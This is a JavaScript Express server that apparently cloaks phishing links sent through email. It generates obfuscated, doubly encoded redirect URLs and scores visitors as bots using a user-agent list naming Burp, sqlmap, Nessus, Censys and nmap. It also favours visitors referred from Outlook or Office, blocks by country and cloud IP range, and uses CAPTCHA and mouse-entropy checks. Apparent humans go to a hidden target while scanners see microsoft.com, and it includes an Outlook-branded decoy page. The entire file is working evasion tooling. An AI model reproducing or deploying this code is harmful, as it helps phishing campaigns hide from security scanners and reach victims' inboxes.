const express = require('express');
const base64 = require('base-64');
const helmet = require('helmet');
const fs = require('fs');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const fetch = require('node-fetch'); // npm install node-fetch@2

const app = express();

app.set('trust proxy', 1);

// ────────────────────────────────────────────────
// CONFIG FROM .env / Render Environment
// ────────────────────────────────────────────────
const TARGET_URL = process.env.TARGET_URL || 'https://www.microsoft.com';   // real user redirect
const BOT_URL     = process.env.BOT_URL     || 'https://www.microsoft.com'; // bots / blocked / fail redirect

const CAPTCHA_PROVIDER = (process.env.CAPTCHA_PROVIDER || 'none').toLowerCase(); // turnstile | hcaptcha | none

const TURNSTILE_SITEKEY = process.env.TURNSTILE_SITEKEY || '';
const TURNSTILE_SECRET  = process.env.TURNSTILE_SECRET  || '';

const HCAPTCHA_SITEKEY = process.env.HCAPTCHA_SITEKEY || '';
const HCAPTCHA_SECRET  = process.env.HCAPTCHA_SECRET  || '';

const ALLOWED_COUNTRIES = (process.env.ALLOWED_COUNTRIES || '').toUpperCase().split(',').filter(c => c.trim());
const BLOCKED_COUNTRIES = (process.env.BLOCKED_COUNTRIES || '').toUpperCase().split(',').filter(c => c.trim());
const GEO_API_URL = process.env.GEO_API_URL || 'https://ipapi.co/{ip}/country/';

const LOG_FILE = 'clicks.log';
const PORT = process.env.PORT || 3000;

// Determine active CAPTCHA
const useTurnstile = CAPTCHA_PROVIDER === 'turnstile' && TURNSTILE_SITEKEY && TURNSTILE_SECRET;
const useHCaptcha  = CAPTCHA_PROVIDER === 'hcaptcha'  && HCAPTCHA_SITEKEY  && HCAPTCHA_SECRET;
const useCaptcha   = useTurnstile || useHCaptcha;

// ────────────────────────────────────────────────
// CSP + NONCE (Helmet)
// Only load CAPTCHA domains when that provider is active
// ────────────────────────────────────────────────
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('hex');
  next();
});

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        (req, res) => `'nonce-${res.locals.nonce}'`,
        ...(useTurnstile ? ['https://challenges.cloudflare.com'] : []),
        ...(useHCaptcha  ? ['https://js.hcaptcha.com', 'https://newassets.hcaptcha.com'] : [])
      ],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:'],
      connectSrc: [
        "'self'",
        ...(useTurnstile ? ['https://challenges.cloudflare.com'] : []),
        ...(useHCaptcha  ? ['https://hcaptcha.com', 'https://*.hcaptcha.com'] : [])
      ],
      frameSrc: [
        ...(useTurnstile ? ['https://challenges.cloudflare.com'] : []),
        ...(useHCaptcha  ? ['https://newassets.hcaptcha.com', 'https://hcaptcha.com'] : [])
      ],
    },
  },
}));

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

// Health checks
app.get(['/ping', '/health', '/healthz', '/status'], (req, res) => res.status(200).send('OK'));

// ────────────────────────────────────────────────
// BOT DETECTION & RATE LIMIT
// ────────────────────────────────────────────────
const strictLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 4,
  message: 'Rate limit exceeded',
  standardHeaders: true,
  legacyHeaders: false,
});

const suspiciousUA = [
  /headless/i, /phantom/i, /slurp/i, /zgrab/i, /scanner/i, /bot/i,
  /crawler/i, /spider/i, /burp/i, /sqlmap/i, /nessus/i, /censys/i,
  /zoomeye/i, /nmap/i, /gobuster/i
];

function isLikelyBot(req) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  const ref = (req.headers['referer'] || '').toLowerCase();
  const accept = req.headers['accept'] || '';

  let score = 0;
  if (suspiciousUA.some(r => r.test(ua))) score += 25;
  if (!ua.includes('mozilla')) score += 12;
  if (ua.includes('compatible ;') || ua.includes('windows nt 5')) score += 10;
  if (ref && !['outlook', 'office', 'microsoft', 'live.com', 'hotmail'].some(r => ref.includes(r))) score += 10;
  if (!accept.includes('text/html')) score += 8;
  if (['13.', '52.', '35.', '34.', '3.'].some(p => req.ip.startsWith(p))) score += 12;
  if (!req.headers['sec-fetch-site'] || !req.headers['sec-fetch-mode']) score += 20;
  if (!req.headers['accept-language']) score += 12;
  if (!req.headers['dnt']) score += 8;
  if (Object.keys(req.headers).join() === Object.keys(req.headers).sort().join()) score += 18;

  console.log(`[BOT] ${req.ip} | Score: ${score}`);
  return score >= 40;
}

// ────────────────────────────────────────────────
// GEO CHECK
// ────────────────────────────────────────────────
async function getCountryCode(req) {
  if (req.headers['cf-ipcountry']) return req.headers['cf-ipcountry'].toUpperCase();

  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
  if (ip === 'unknown' || ip.startsWith('127.') || ip.startsWith('::1')) return 'XX';

  try {
    const res = await fetch(GEO_API_URL.replace('{ip}', ip), { timeout: 3000 });
    if (res.ok) return (await res.text()).trim().toUpperCase();
  } catch (err) {
    console.log(`[GEO FAIL] ${ip} | ${err.message}`);
  }
  return 'XX';
}

// ────────────────────────────────────────────────
// CAPTCHA VERIFICATION (supports Turnstile & hCaptcha)
// ────────────────────────────────────────────────
app.post('/captcha-verify', async (req, res) => {
  const { token } = req.body;
  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';

  if (!token) return res.status(400).json({ success: false, error: 'No token' });

  let verifyUrl, secret;

  if (useTurnstile) {
    verifyUrl = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
    secret = TURNSTILE_SECRET;
  } else if (useHCaptcha) {
    verifyUrl = 'https://hcaptcha.com/siteverify';
    secret = HCAPTCHA_SECRET;
  } else {
    return res.status(400).json({ success: false, error: 'No CAPTCHA configured' });
  }

  try {
    const form = new URLSearchParams({ secret, response: token, remoteip: ip });
    const verify = await fetch(verifyUrl, {
      method: 'POST',
      body: form,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    });
    const result = await verify.json();

    res.json({ success: !!result.success });
  } catch (err) {
    console.error('[CAPTCHA VERIFY ERROR]', err.message);
    res.status(500).json({ success: false });
  }
});

// ────────────────────────────────────────────────
// GENERATE LINK
// ────────────────────────────────────────────────
app.get('/generate', (req, res) => {
  const target = req.query.target || TARGET_URL;
  const noisy = target + '#' + crypto.randomBytes(8).toString('hex') + '-' + Date.now();
  let enc = base64.encode(noisy);
  enc = encodeURIComponent(enc);
  let doubleEnc = enc.replace(/%/g, '%25');
  const finalEnc = encodeURIComponent(doubleEnc);

  const segments = [];
  for (let i = 0; i < 6; i++) {
    segments.push(crypto.randomBytes(8).toString('hex') + Math.random().toString(36).substring(2, 12).toUpperCase() + (i % 2 ? 'verify' : 'session'));
  }

  const path = `/r/${segments.join('/')}/${crypto.randomBytes(12).toString('hex')}`;

  const params = [];
  const keys = ['sid', 'tok', 'ref', 'utm_src', 'clid', 'ver', 'ts', 'hmac', 'nonce', '_t', 'cid', 'fid'];
  for (let i = 0; i < 12; i++) {
    const k = keys[i % keys.length] + (i > 6 ? '_' + (i + 1) : '');
    const v = encodeURIComponent(crypto.randomBytes(10 + Math.floor(Math.random() * 20)).toString('base64url').repeat(2));
    params.push(`${k}=${v}`);
  }

  const url = `https://${req.hostname}${path}?p=${finalEnc}&v=6.9.${Math.floor(Math.random()*100)}&ts=${Date.now().toString(36).toUpperCase()}&h=${crypto.randomBytes(20).toString('hex')}&${params.join('&')}&z=${encodeURIComponent(crypto.randomBytes(16).toString('base64'))}`;

  console.log(`[GENERATED] ${url.length} chars → ${target}`);
  res.json({ success: true, tracked: url, length: url.length });
});

// ────────────────────────────────────────────────
// MAIN ROUTE /r/*
// ────────────────────────────────────────────────
app.get('/r/*', strictLimiter, async (req, res) => {
  const ua = req.headers['user-agent'] || '';
  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';

  const country = await getCountryCode(req);

  let geoAllowed = true;
  if (ALLOWED_COUNTRIES.length) geoAllowed = ALLOWED_COUNTRIES.includes(country);
  if (BLOCKED_COUNTRIES.includes(country)) geoAllowed = false;

  const benignPage = `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Outlook</title><style>body{font-family:'Segoe UI',sans-serif;background:#fff;}.hdr{background:#0078d4;color:#fff;padding:12px;}.cnt{padding:24px;}</style></head><body><div class="hdr">Outlook</div><div class="cnt"><h1>Loading inbox...</h1><p>Please wait.</p></div></body></html>`;

  // Block bots or geo-restricted → send to BOT_URL
  if (!geoAllowed || isLikelyBot(req)) {
    const reason = !geoAllowed ? 'GEO_BLOCKED' : 'BOT_BLOCK';
    fs.appendFile(LOG_FILE, `${new Date().toISOString()} ${reason} ${ip} ${country}\n`, () => {});
    return res.redirect(BOT_URL);
  }

  fs.appendFile(LOG_FILE, `${new Date().toISOString()} ACCESS ${ip} ${country} ${ua}\n`, () => {});

  // Decode target from ?p= (fallback to TARGET_URL if missing/invalid)
  let redirectTarget = TARGET_URL;
  try {
    const query = req.url.split('?')[1] || '';
    const params = new URLSearchParams(query);
    let enc = params.get('p') || '';
    if (enc) {
      let s1 = decodeURIComponent(enc).replace(/%25/g, '%');
      let s2 = decodeURIComponent(s1);
      let decoded = Buffer.from(s2, 'base64').toString('utf-8');

      const hashIdx = decoded.indexOf('#');
      if (hashIdx !== -1) decoded = decoded.substring(0, hashIdx);

      if (!/^https?:\/\//i.test(decoded)) decoded = 'https://' + decoded;

      const urlObj = new URL(decoded);
      if (urlObj.protocol === 'http:' || urlObj.protocol === 'https:') {
        redirectTarget = decoded;
      }
    }
  } catch (err) {
    console.error(`${new Date().toISOString()} DECODE_ERROR ${ip} | ${err.message}`);
  }

  const safeTarget = redirectTarget.replace(/'/g, "\\'").replace(/\\/g, "\\\\");

  // ────────────────────────────────────────────────
  // VERIFICATION PAGE
  // ────────────────────────────────────────────────
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Session Verification</title>

  <!-- CAPTCHA script - only when provider active -->
  ${useTurnstile ? `<script nonce="${res.locals.nonce}" src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>` : ''}
  ${useHCaptcha  ? `<script nonce="${res.locals.nonce}" src="https://js.hcaptcha.com/1/api.js" async defer></script>` : ''}

  <style>
    body { font-family: system-ui, sans-serif; background:#f3f2f1; margin:0; display:flex; align-items:center; justify-content:center; min-height:100vh; color:#333; }
    .box { background:white; padding:40px; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.1); text-align:center; max-width:400px; }
    .spin { border:5px solid #ddd; border-top:5px solid #0067c5; border-radius:50%; width:48px; height:48px; animation:spin 1s linear infinite; margin:0 auto 20px; }
    @keyframes spin { to { transform:rotate(360deg); } }
    h2 { margin:0 0 16px; }
    p { margin:0 0 24px; color:#555; }
    #error-msg { color: #d32f2f; margin-top: 20px; font-size: 14px; display: none; }
  </style>
</head>
<body>
  <div class="box">
    <div class="spin"></div>
    <h2>Verifying session</h2>
    <p>Please wait...</p>

    ${useTurnstile ? `
      <div class="cf-turnstile"
           data-sitekey="${TURNSTILE_SITEKEY}"
           data-callback="onCaptchaSuccess"
           data-theme="light"
           data-size="invisible"></div>
    ` : ''}
    ${useHCaptcha ? `
      <div class="h-captcha"
           data-sitekey="${HCAPTCHA_SITEKEY}"
           data-callback="onCaptchaSuccess"
           data-theme="light"
           data-size="invisible"></div>
    ` : ''}

    <div id="error-msg"></div>
  </div>

  <script nonce="${res.locals.nonce}">
    const errorDiv = document.getElementById('error-msg');

    function showError(msg) {
      console.error('[CAPTCHA Error]', msg);
      if (errorDiv) {
        errorDiv.textContent = msg;
        errorDiv.style.display = 'block';
      }
    }

    let moves = 0;
    let entropy = 0;
    let lastX = 0, lastY = 0, lastTime = Date.now();

    const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    const minMoves   = mobile ? 3 : 5;
    const minEntropy = mobile ? 9 : 16;

    function updateEntropy(dx, dy, type) {
      const now = Date.now();
      const dt = (now - lastTime) / 1000 || 1;
      const dist = Math.sqrt(dx*dx + dy*dy);
      entropy += Math.log2(1 + dist + 1) / dt * (type === 'touch' ? 4 : 1);
      lastTime = now;
      moves++;
    }

    document.addEventListener('mousemove', e => {
      if (lastX && lastY) updateEntropy(Math.abs(e.clientX - lastX), Math.abs(e.clientY - lastY), 'mouse');
      lastX = e.clientX; lastY = e.clientY;
    });

    document.addEventListener('touchmove', e => {
      if (e.touches?.length) {
        const t = e.touches[0];
        if (lastX && lastY) updateEntropy(Math.abs(t.clientX - lastX), Math.abs(t.clientY - lastY), 'touch');
        lastX = t.clientX; lastY = t.clientY;
      }
    });

    window.addEventListener('scroll', () => { entropy += 10; moves += 2; });
    window.addEventListener('wheel', () => { entropy += 8; moves += 2; });
    document.addEventListener('keydown', () => { entropy += 6; moves += 2; });

    function onCaptchaSuccess(token) {
      console.log('[CAPTCHA] Token received');
      fetch('/captcha-verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token })
      })
      .then(r => r.json())
      .then(data => {
        if (!data.success) {
          showError('CAPTCHA failed');
          return location.href = '${BOT_URL}';
        }
        console.log('[CAPTCHA] Verified');
        proceedToRedirect();
      })
      .catch(err => {
        console.error('[CAPTCHA] Fetch error:', err);
        showError('Verification server error');
        location.href = '${BOT_URL}';
      });
    }

    function proceedToRedirect() {
      setTimeout(() => {
        console.log('CHECK | Moves:', moves, 'Entropy:', entropy.toFixed(1));
        if (moves >= minMoves && entropy >= minEntropy) {
          location.href = '${TARGET_URL}';
        } else {
          location.href = '${BOT_URL}';
        }
      }, 1200 + Math.random() * 1800);
    }

    // Main timeout / fallback (15s max)
    setTimeout(() => {
      if (${useCaptcha ? 'typeof turnstile !== "undefined" || typeof hcaptcha !== "undefined"' : 'true'}) {
        proceedToRedirect();
      } else {
        console.error('[CAPTCHA] Failed to load');
        location.href = '${BOT_URL}';
      }
    }, 15000);
  </script>
</body>
</html>
  `);
});

// Catch-all redirect to bot URL
app.use((req, res) => res.redirect(BOT_URL));

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
});